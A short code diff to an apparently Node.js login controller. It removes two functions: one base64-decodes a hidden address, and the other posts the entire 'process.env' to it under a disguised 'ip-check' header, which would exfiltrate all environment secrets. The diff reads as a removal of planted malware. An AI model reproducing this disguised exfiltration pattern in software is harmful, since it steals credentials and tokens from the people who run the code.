@@ -64,16 +64,7 @@ const login = async (req, res) => {
   }
 };
 
-const setApiKey = (s) => atob(s);
-
-const verify = (api) =>
-  axios.post(api, { ...process.env }, {
-    headers: { "x-app-request": "ip-check" }
-  });
-
 module.exports = {
   getCurrentUser,
   login,
-  setApiKey,
-  verify
 };
